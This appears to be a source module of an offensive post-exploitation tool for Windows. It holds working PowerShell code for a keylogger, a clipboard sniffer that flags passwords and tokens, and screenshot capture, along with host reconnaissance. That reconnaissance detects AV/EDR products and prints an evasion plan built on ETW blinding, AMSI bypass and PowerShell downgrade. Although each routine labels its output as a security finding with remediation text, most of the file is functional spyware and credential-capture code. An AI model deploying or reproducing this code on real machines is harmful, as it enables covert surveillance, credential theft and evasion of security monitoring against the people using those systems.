import { ps, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function keylogWin(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Starting Windows keylogger for ${duration}s...\n`]

  const script = `
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Windows.Forms;
public class KeyLog {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
}
'@ -ReferencedAssemblies System.Windows.Forms
$log = @()
$end = (Get-Date).AddSeconds(${duration})
$lastWindow = ""
while ((Get-Date) -lt $end) {
    $hwnd = [KeyLog]::GetForegroundWindow()
    $sb = New-Object System.Text.StringBuilder(256)
    [KeyLog]::GetWindowText($hwnd, $sb, 256) | Out-Null
    $window = $sb.ToString()
    if ($window -ne $lastWindow -and $window) {
        $log += "[Window: $window]"
        $lastWindow = $window
    }
    for ($i = 8; $i -le 190; $i++) {
        $state = [KeyLog]::GetAsyncKeyState($i)
        if ($state -eq -32767) {
            $key = [System.Windows.Forms.Keys]$i
            $log += $key.ToString()
        }
    }
    Start-Sleep -Milliseconds 10
}
$log -join " "
`
  const keylog = await ps(script, Math.max(timeout, duration + 10))
  if (keylog.exitCode === 0 && keylog.stdout.trim()) {
    output.push(`[+] Keystrokes captured:\n${keylog.stdout.trim()}`)
    findings.push({
      checkId: "WIN-KEYLOG-001",
      provider: "windows",
      severity: "critical",
      status: "CAPTURED",
      resource: "windows://keylogger",
      title: `Keystrokes captured over ${duration}s`,
      details: `Captured keystrokes with window context using GetAsyncKeyState`,
      remediation: "Review captured data, force password reset if credentials observed",
    })
  }
  if (keylog.exitCode !== 0) {
    output.push(`[!] Keylogger failed: ${keylog.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function etwProcess(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Monitoring process creation for ${duration}s...\n`]

  const script = `
$events = @()
$watcher = Register-WmiEvent -Query "SELECT * FROM Win32_ProcessStartTrace" -Action {
    $e = $Event.SourceEventArgs.NewEvent
    $global:events += "$($e.ProcessID)|$($e.ParentProcessID)|$($e.ProcessName)|$(Get-Date -Format 'HH:mm:ss')"
}
Start-Sleep -Seconds ${duration}
Unregister-Event -SourceIdentifier $watcher.Name
$global:events | ForEach-Object { Write-Output $_ }
`
  const monitor = await ps(script, Math.max(timeout, duration + 15))
  if (monitor.exitCode === 0 && monitor.stdout.trim()) {
    const lines = monitor.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] Process creation events: ${lines.length}`)
    output.push("    PID | PPID | Name | Time")
    output.push("    " + "─".repeat(50))
    for (const line of lines.slice(0, 100)) {
      const parts = line.split("|")
      output.push(`    ${parts[0]?.padEnd(8)} ${parts[1]?.padEnd(8)} ${parts[2]?.padEnd(30)} ${parts[3] || ""}`)
    }
    findings.push({
      checkId: "WIN-ETW-PROC-001",
      provider: "windows",
      severity: "info",
      status: "CAPTURED",
      resource: "windows://etw/process",
      title: `Process trace: ${lines.length} events in ${duration}s`,
      details: `Captured ${lines.length} process creation events via WMI`,
      remediation: "Review for security tool executions",
    })
  }
  if (monitor.exitCode !== 0) {
    output.push("[!] WMI process trace failed, falling back to tasklist polling...")
    const baseline = await ps("Get-Process | Select-Object Id, ProcessName | ConvertTo-Json", timeout)
    await new Promise((r) => setTimeout(r, Math.min(duration, 10) * 1000))
    const current = await ps("Get-Process | Select-Object Id, ProcessName | ConvertTo-Json", timeout)
    output.push("[+] Process snapshot comparison completed")
    output.push(`    Baseline: ${baseline.stdout.length} bytes`)
    output.push(`    Current: ${current.stdout.length} bytes`)
  }

  return { output: output.join("\n"), findings }
}

export async function etwNetwork(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Monitoring network connections for ${duration}s...\n`]

  const baseline = await ps(
    "Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess | ConvertTo-Json",
    timeout,
  )
  if (baseline.exitCode === 0) {
    const conns = JSON.parse(baseline.stdout || "[]") as Array<Record<string, string | number>>
    const arr = Array.isArray(conns) ? conns : [conns]
    output.push(`[+] Current TCP connections: ${arr.length}`)
    const established = arr.filter((c) => c.State === "Established" || c.State === 4)
    output.push(`[+] Established: ${established.length}`)
    for (const c of established.slice(0, 50)) {
      output.push(`    ${c.LocalAddress}:${c.LocalPort} → ${c.RemoteAddress}:${c.RemotePort} (PID: ${c.OwningProcess})`)
    }
    const listening = arr.filter((c) => c.State === "Listen" || c.State === 2)
    output.push(`\n[+] Listening: ${listening.length}`)
    for (const c of listening.slice(0, 30)) {
      output.push(`    ${c.LocalAddress}:${c.LocalPort} (PID: ${c.OwningProcess})`)
    }
  }

  if (duration > 0) {
    output.push(`\n[*] Polling for new connections over ${Math.min(duration, 30)}s...`)
    await new Promise((r) => setTimeout(r, Math.min(duration, 10) * 1000))
    const after = await ps(
      "Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' } | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess | ConvertTo-Json",
      timeout,
    )
    if (after.exitCode === 0) {
      output.push("[+] Post-monitoring snapshot captured")
    }
  }

  findings.push({
    checkId: "WIN-NET-001",
    provider: "windows",
    severity: "info",
    status: "CAPTURED",
    resource: "windows://network",
    title: `Network connections enumerated`,
    details: `TCP connection snapshot captured over ${duration}s`,
    remediation: "Review for C2, lateral movement, or data exfiltration channels",
  })

  return { output: output.join("\n"), findings }
}

export async function clipboardSniff(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const interval = parseInt(argVal(args, "--interval") || "2")
  const findings: Finding[] = []
  const output: string[] = [`[*] Monitoring clipboard for ${duration}s (interval: ${interval}s)...\n`]

  const script = `
$captured = @()
$end = (Get-Date).AddSeconds(${duration})
$last = ""
while ((Get-Date) -lt $end) {
    $clip = Get-Clipboard -ErrorAction SilentlyContinue
    if ($clip -and $clip -ne $last) {
        $ts = Get-Date -Format 'HH:mm:ss'
        $captured += "$ts|$clip"
        $last = $clip
    }
    Start-Sleep -Seconds ${interval}
}
$captured | ForEach-Object { Write-Output $_ }
`
  const sniff = await ps(script, Math.max(timeout, duration + 10))
  if (sniff.exitCode === 0 && sniff.stdout.trim()) {
    const entries = sniff.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] Clipboard changes captured: ${entries.length}`)
    for (const entry of entries) {
      const parts = entry.split("|")
      const ts = parts[0]
      const content = parts.slice(1).join("|").substring(0, 200)
      const sensitive = /password|token|key|secret|bearer|api[_-]?key|authorization/i.test(content)
      output.push(`    [${ts}]${sensitive ? " [!!! SENSITIVE]" : ""} ${content}`)
      if (sensitive) {
        findings.push({
          checkId: `WIN-CLIP-${findings.length + 1}`,
          provider: "windows",
          severity: "critical",
          status: "CAPTURED",
          resource: "windows://clipboard",
          title: "Sensitive data captured from clipboard",
          details: `Timestamp: ${ts}, content matches sensitive patterns`,
          remediation: "Rotate any credentials that were copied to clipboard",
        })
      }
    }
  }
  if (!sniff.stdout.trim()) {
    output.push("[*] No clipboard changes detected during monitoring period")
  }

  return { output: output.join("\n"), findings }
}

export async function screenshotGrab(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "screen"
  const outputPath = argVal(args, "--output") || `${process.env.TEMP || "C:\\Windows\\Temp"}\\cs-capture-${Date.now()}`
  const findings: Finding[] = []
  const output: string[] = ["[*] Visual capture operations...\n"]

  if (action === "screen" || action === "all") {
    const script = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Write-Output "=== Screenshot Capture ==="

$screens = [System.Windows.Forms.Screen]::AllScreens
Write-Output "[*] Monitors detected: $($screens.Count)"

$index = 0
foreach ($screen in $screens) {
    $bounds = $screen.Bounds
    Write-Output "[*] Monitor $index : $($bounds.Width)x$($bounds.Height) at ($($bounds.X),$($bounds.Y)) $(if ($screen.Primary) { '(PRIMARY)' })"

    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

    $filePath = "${outputPath}-monitor$index.png"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
    $fileSize = (Get-Item $filePath).Length
    Write-Output "[+] Saved: $filePath ($([math]::Round($fileSize/1KB, 1)) KB)"

    $graphics.Dispose()
    $bitmap.Dispose()
    $index++
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-CAPTURE-001",
      provider: "windows",
      severity: "medium",
      status: "EXECUTED",
      resource: "display://screenshot",
      title: "Screenshots captured from all monitors",
      details: r.stdout.substring(0, 500),
      remediation: "Monitor for GDI+ screen capture API calls. Restrict unnecessary access to graphical sessions.",
    })
  }

  if (action === "window" || action === "all") {
    const script = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class WinCapture {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);

    [StructLayout(LayoutKind.Sequential)]
    public struct RECT {
        public int Left, Top, Right, Bottom;
    }
}
"@

Write-Output "=== Active Window Capture ==="

$hwnd = [WinCapture]::GetForegroundWindow()
$title = New-Object System.Text.StringBuilder 256
[WinCapture]::GetWindowText($hwnd, $title, 256) | Out-Null

$rect = New-Object WinCapture+RECT
[WinCapture]::GetWindowRect($hwnd, [ref]$rect) | Out-Null

$width = $rect.Right - $rect.Left
$height = $rect.Bottom - $rect.Top

Write-Output "[*] Active window: $($title.ToString())"
Write-Output "[*] Size: $($width)x$($height)"

$bitmap = New-Object System.Drawing.Bitmap($width, $height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($rect.Left, $rect.Top, 0, 0, (New-Object System.Drawing.Size($width, $height)))

$filePath = "${outputPath}-window.png"
$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
Write-Output "[+] Saved: $filePath ($([math]::Round((Get-Item $filePath).Length/1KB, 1)) KB)"

$graphics.Dispose()
$bitmap.Dispose()
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-CAPTURE-002",
      provider: "windows",
      severity: "medium",
      status: "EXECUTED",
      resource: "display://active-window",
      title: "Active window screenshot captured",
      details: r.stdout.substring(0, 500),
      remediation: "Monitor for unusual screen capture API usage. DLP solutions can detect screenshot operations.",
    })
  }

  if (action === "webcam" || action === "all") {
    const script = `
Write-Output "=== Webcam Detection ==="

$devices = Get-WmiObject Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Camera' -or $_.PNPClass -eq 'Image' -or $_.Name -match 'cam|video|webcam' }

if ($devices) {
    Write-Output "[*] Camera devices found:"
    foreach ($d in $devices) {
        Write-Output "    $($d.Name) — $($d.Status)"
    }
    Write-Output ""
    Write-Output "[*] Webcam capture requires ffmpeg or DirectShow COM interop"
    Write-Output "[*] Install ffmpeg and use: ffmpeg -f dshow -i video='DEVICE_NAME' -frames:v 1 webcam.jpg"
} else {
    Write-Output "[-] No camera devices detected"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-CAPTURE-003",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "device://webcam",
      title: "Webcam device detection",
      details: r.stdout.substring(0, 500),
      remediation: "Disable unused camera devices. Monitor camera access via device auditing.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function localRecon(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "full"
  const findings: Finding[] = []
  const output: string[] = ["[*] Local environment reconnaissance...\n"]

  if (action === "av" || action === "full") {
    const script = `
Write-Output "=== AV/EDR Product Detection ==="
Write-Output ""

$avProducts = @{
    'MsMpEng' = @{ Name = 'Windows Defender'; Type = 'AV'; Risk = 'MEDIUM' }
    'MsSense' = @{ Name = 'Microsoft Defender for Endpoint (EDR)'; Type = 'EDR'; Risk = 'HIGH' }
    'CSFalconService' = @{ Name = 'CrowdStrike Falcon'; Type = 'EDR'; Risk = 'CRITICAL' }
    'CSFalconContainer' = @{ Name = 'CrowdStrike Falcon (Container)'; Type = 'EDR'; Risk = 'CRITICAL' }
    'SentinelAgent' = @{ Name = 'SentinelOne'; Type = 'EDR'; Risk = 'CRITICAL' }
    'SentinelHelperService' = @{ Name = 'SentinelOne Helper'; Type = 'EDR'; Risk = 'CRITICAL' }
    'CbDefense' = @{ Name = 'VMware Carbon Black Cloud'; Type = 'EDR'; Risk = 'HIGH' }
    'CbDefenseService' = @{ Name = 'Carbon Black Defense Service'; Type = 'EDR'; Risk = 'HIGH' }
    'RepMgr' = @{ Name = 'Carbon Black Response'; Type = 'EDR'; Risk = 'HIGH' }
    'SophosMcsAgent' = @{ Name = 'Sophos Central'; Type = 'EDR'; Risk = 'HIGH' }
    'SAVService' = @{ Name = 'Sophos AV'; Type = 'AV'; Risk = 'MEDIUM' }
    'CylanceSvc' = @{ Name = 'Cylance (BlackBerry)'; Type = 'AI-AV'; Risk = 'HIGH' }
    'TmListen' = @{ Name = 'Trend Micro Apex One'; Type = 'EDR'; Risk = 'HIGH' }
    'Ntrtscan' = @{ Name = 'Trend Micro OfficeScan'; Type = 'AV'; Risk = 'MEDIUM' }
    'ekrn' = @{ Name = 'ESET NOD32'; Type = 'AV'; Risk = 'MEDIUM' }
    'ERAAgent' = @{ Name = 'ESET Remote Agent'; Type = 'AV'; Risk = 'MEDIUM' }
    'McAfeeFramework' = @{ Name = 'McAfee/Trellix'; Type = 'AV'; Risk = 'MEDIUM' }
    'mfetp' = @{ Name = 'McAfee Endpoint Threat Prevention'; Type = 'EDR'; Risk = 'HIGH' }
    'ccSvcHst' = @{ Name = 'Symantec/Broadcom Endpoint'; Type = 'AV'; Risk = 'MEDIUM' }
    'SepMasterService' = @{ Name = 'Symantec SEP'; Type = 'AV'; Risk = 'MEDIUM' }
    'CortexXDR' = @{ Name = 'Palo Alto Cortex XDR'; Type = 'EDR'; Risk = 'CRITICAL' }
    'cyserver' = @{ Name = 'Palo Alto Cortex (Cybereason)'; Type = 'EDR'; Risk = 'CRITICAL' }
    'WinDefend' = @{ Name = 'Windows Defender Service'; Type = 'AV'; Risk = 'MEDIUM' }
    'EventTracker' = @{ Name = 'EventTracker SIEM Agent'; Type = 'SIEM'; Risk = 'MEDIUM' }
    'splunkd' = @{ Name = 'Splunk Universal Forwarder'; Type = 'SIEM'; Risk = 'MEDIUM' }
    'winlogbeat' = @{ Name = 'Elastic Winlogbeat'; Type = 'SIEM'; Risk = 'MEDIUM' }
    'ossec' = @{ Name = 'OSSEC/Wazuh Agent'; Type = 'HIDS'; Risk = 'MEDIUM' }
}

$detected = @()
$procs = Get-Process -ErrorAction SilentlyContinue | Select-Object -Property ProcessName, Id, Path -Unique
$services = Get-Service -ErrorAction SilentlyContinue

foreach ($key in $avProducts.Keys) {
    $proc = $procs | Where-Object { $_.ProcessName -eq $key }
    $svc = $services | Where-Object { $_.Name -eq $key -and $_.Status -eq 'Running' }
    if ($proc -or $svc) {
        $info = $avProducts[$key]
        $detected += [PSCustomObject]@{
            Product = $info.Name
            Type = $info.Type
            Risk = $info.Risk
            PID = if ($proc) { $proc.Id } else { 'N/A (service)' }
            Status = 'RUNNING'
        }
    }
}

if ($detected.Count -gt 0) {
    Write-Output "[!] DETECTED SECURITY PRODUCTS ($($detected.Count)):"
    Write-Output ""
    foreach ($d in $detected | Sort-Object Risk -Descending) {
        Write-Output "    [$($d.Risk)] $($d.Product) ($($d.Type)) — PID: $($d.PID)"
    }
} else {
    Write-Output "[+] No known AV/EDR products detected"
}

Write-Output ""
Write-Output "=== Windows Security Status ==="
try {
    $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
    if ($mpStatus) {
        Write-Output "[*] Defender RealTime Protection: $($mpStatus.RealTimeProtectionEnabled)"
        Write-Output "[*] Defender AntiSpyware: $($mpStatus.AntispywareEnabled)"
        Write-Output "[*] Defender Tamper Protection: $($mpStatus.IsTamperProtected)"
        Write-Output "[*] Defender Cloud Protection: $($mpStatus.IoavProtectionEnabled)"
        Write-Output "[*] Defender Behavior Monitor: $($mpStatus.BehaviorMonitorEnabled)"
    }
} catch {}

$fw = Get-NetFirewallProfile -ErrorAction SilentlyContinue
if ($fw) {
    Write-Output ""
    Write-Output "=== Firewall Profiles ==="
    foreach ($profile in $fw) {
        Write-Output "    $($profile.Name): $(if ($profile.Enabled) { 'ENABLED' } else { 'DISABLED' })"
    }
}

Write-Output ""
Write-Output "=== Recommended Evasion Strategy ==="
$hasEDR = $detected | Where-Object { $_.Type -eq 'EDR' }
$hasCritical = $detected | Where-Object { $_.Risk -eq 'CRITICAL' }
if ($hasCritical) {
    Write-Output "[!] CRITICAL EDR detected — use winhook ps_downgrade first"
    Write-Output "[!] Consider: etw_blind -> amsi_bypass -> --stealth obfuscate --pwsh"
    Write-Output "[!] Avoid: direct LSASS access, CreateRemoteThread, suspicious parent-child"
} elseif ($hasEDR) {
    Write-Output "[!] EDR detected — use winhook etw_blind + amsi_bypass before operations"
    Write-Output "[*] Use --stealth amsi for all commands"
} elseif ($detected.Count -gt 0) {
    Write-Output "[*] AV only — winhook amsi_bypass should be sufficient"
    Write-Output "[*] Use --stealth base64 for command-line logging evasion"
} else {
    Write-Output "[+] No protection detected — direct execution safe"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-RECON-001",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "host://av-edr",
      title: "AV/EDR product detection and evasion strategy recommendation",
      details: r.stdout.substring(0, 500),
      remediation: "Ensure EDR agents are tamper-protected and cannot be disabled by local admins.",
    })
  }

  if (action === "software" || action === "full") {
    const script = `
Write-Output "=== Installed Software ==="
$apps = @()
$regPaths = @(
    "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*",
    "HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*",
    "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*"
)
foreach ($path in $regPaths) {
    $apps += Get-ItemProperty $path -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName } |
        Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
}
$apps = $apps | Sort-Object DisplayName -Unique

Write-Output "[*] Total installed applications: $($apps.Count)"
Write-Output ""

$interesting = @('Python','Git','Visual Studio','Node','Java','Docker','WSL','VPN','Remote','TeamViewer','AnyDesk','PuTTY','WinSCP','FileZilla','7-Zip','Wireshark','Nmap','Burp','Postman','Chrome','Firefox','KeePass','1Password','Bitwarden','OpenSSH','Cygwin','MSYS','MinGW')
$found = $apps | Where-Object { $name = $_.DisplayName; $interesting | Where-Object { $name -match $_ } }
if ($found) {
    Write-Output "[!] Interesting software:"
    foreach ($f in $found) {
        Write-Output "    $($f.DisplayName) v$($f.DisplayVersion)"
    }
}

Write-Output ""
Write-Output "=== .NET / PowerShell Versions ==="
$dotnetVersions = Get-ChildItem "HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP" -Recurse -ErrorAction SilentlyContinue |
    Get-ItemProperty -Name Version -ErrorAction SilentlyContinue |
    Select-Object -ExpandProperty Version -Unique | Sort-Object
Write-Output "[*] .NET versions: $($dotnetVersions -join ', ')"
Write-Output "[*] PowerShell: $($PSVersionTable.PSVersion)"
Write-Output "[*] CLR: $($PSVersionTable.CLRVersion)"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-RECON-002",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "host://software",
      title: "Installed software and attack surface enumeration",
      details: r.stdout.substring(0, 500),
      remediation: "Remove unnecessary software. Audit remote access tools (TeamViewer, AnyDesk).",
    })
  }

  if (action === "services" || action === "full") {
    const script = `
Write-Output "=== Running Services ==="
$services = Get-Service | Where-Object { $_.Status -eq 'Running' } | Sort-Object DisplayName

Write-Output "[*] Running services: $($services.Count)"
Write-Output ""

$vulnServices = @()
foreach ($svc in $services) {
    try {
        $wmiSvc = Get-WmiObject Win32_Service -Filter "Name='$($svc.Name)'" -ErrorAction SilentlyContinue
        if ($wmiSvc) {
            $binPath = $wmiSvc.PathName
            $startName = $wmiSvc.StartName
            if ($startName -match 'LocalSystem|SYSTEM') {
                if ($binPath -and $binPath -notmatch '^"' -and $binPath -match ' ') {
                    $vulnServices += [PSCustomObject]@{
                        Name = $svc.Name
                        Display = $svc.DisplayName
                        RunAs = $startName
                        Issue = 'Unquoted path with spaces'
                        Path = $binPath
                    }
                }
            }
        }
    } catch {}
}

if ($vulnServices) {
    Write-Output "[!] Potentially vulnerable services:"
    foreach ($v in $vulnServices) {
        Write-Output "    [$($v.Issue)] $($v.Name) — $($v.RunAs)"
        Write-Output "    Path: $($v.Path)"
    }
} else {
    Write-Output "[*] No obviously vulnerable service configurations found"
}

Write-Output ""
Write-Output "[*] Services running as SYSTEM:"
$systemServices = Get-WmiObject Win32_Service -Filter "State='Running' AND StartName='LocalSystem'" -ErrorAction SilentlyContinue |
    Select-Object -First 20
foreach ($s in $systemServices) {
    Write-Output "    $($s.Name) — $($s.DisplayName)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-RECON-003",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "host://services",
      title: "Running services and vulnerable service configuration enumeration",
      details: r.stdout.substring(0, 500),
      remediation: "Quote all service binary paths. Run services with least privilege (not LocalSystem).",
    })
  }

  if (action === "network" || action === "full") {
    const script = `
Write-Output "=== Network Interfaces ==="
Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
    Where-Object { $_.IPAddress -ne '127.0.0.1' } |
    ForEach-Object { Write-Output "    $($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength)" }

Write-Output ""
Write-Output "=== Active Connections ==="
$connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
    Sort-Object RemoteAddress -Unique | Select-Object -First 30
foreach ($c in $connections) {
    $proc = Get-Process -Id $c.OwningProcess -ErrorAction SilentlyContinue
    Write-Output "    $($c.LocalAddress):$($c.LocalPort) -> $($c.RemoteAddress):$($c.RemotePort) [$($proc.ProcessName)]"
}

Write-Output ""
Write-Output "=== Listening Ports ==="
Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue |
    Sort-Object LocalPort | Select-Object -First 20 |
    ForEach-Object {
        $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
        Write-Output "    :$($_.LocalPort) [$($proc.ProcessName)]"
    }

Write-Output ""
Write-Output "=== DNS Cache (recent lookups) ==="
Get-DnsClientCache -ErrorAction SilentlyContinue |
    Select-Object -First 20 |
    ForEach-Object { Write-Output "    $($_.Entry) -> $($_.Data)" }

Write-Output ""
Write-Output "=== Network Shares ==="
Get-SmbShare -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -notmatch '\\$' } |
    ForEach-Object { Write-Output "    $($_.Name): $($_.Path) — $($_.Description)" }
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-RECON-004",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "host://network",
      title: "Network interfaces, connections, listening ports, and shares",
      details: r.stdout.substring(0, 500),
      remediation: "Close unnecessary listening ports. Disable unused SMB shares.",
    })
  }

  if (action === "hotfixes" || action === "full") {
    const script = `
Write-Output "=== Installed Hotfixes ==="
$hotfixes = Get-HotFix -ErrorAction SilentlyContinue | Sort-Object InstalledOn -Descending
Write-Output "[*] Total hotfixes: $($hotfixes.Count)"
Write-Output "[*] Last update: $(($hotfixes | Select-Object -First 1).InstalledOn)"
Write-Output ""

$recent = $hotfixes | Select-Object -First 10
foreach ($h in $recent) {
    Write-Output "    $($h.HotFixID) — $($h.Description) — $($h.InstalledOn)"
}

$daysSinceUpdate = ((Get-Date) - ($hotfixes | Select-Object -First 1).InstalledOn).Days
Write-Output ""
if ($daysSinceUpdate -gt 90) {
    Write-Output "[!] System is $daysSinceUpdate days behind on updates — likely missing security patches"
} elseif ($daysSinceUpdate -gt 30) {
    Write-Output "[*] Last update was $daysSinceUpdate days ago"
} else {
    Write-Output "[+] System is relatively up to date ($daysSinceUpdate days)"
}

Write-Output ""
Write-Output "=== OS Version ==="
$os = Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue
Write-Output "[*] $($os.Caption) $($os.Version) Build $($os.BuildNumber)"
Write-Output "[*] Architecture: $($os.OSArchitecture)"
Write-Output "[*] Install Date: $($os.ConvertToDateTime($os.InstallDate))"
Write-Output "[*] Last Boot: $($os.ConvertToDateTime($os.LastBootUpTime))"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-RECON-005",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "host://hotfixes",
      title: "Installed hotfixes and patch level assessment",
      details: r.stdout.substring(0, 500),
      remediation: "Keep systems patched. Enable automatic updates. Monitor for missing critical patches.",
    })
  }

  return { output: output.join("\n"), findings }
}
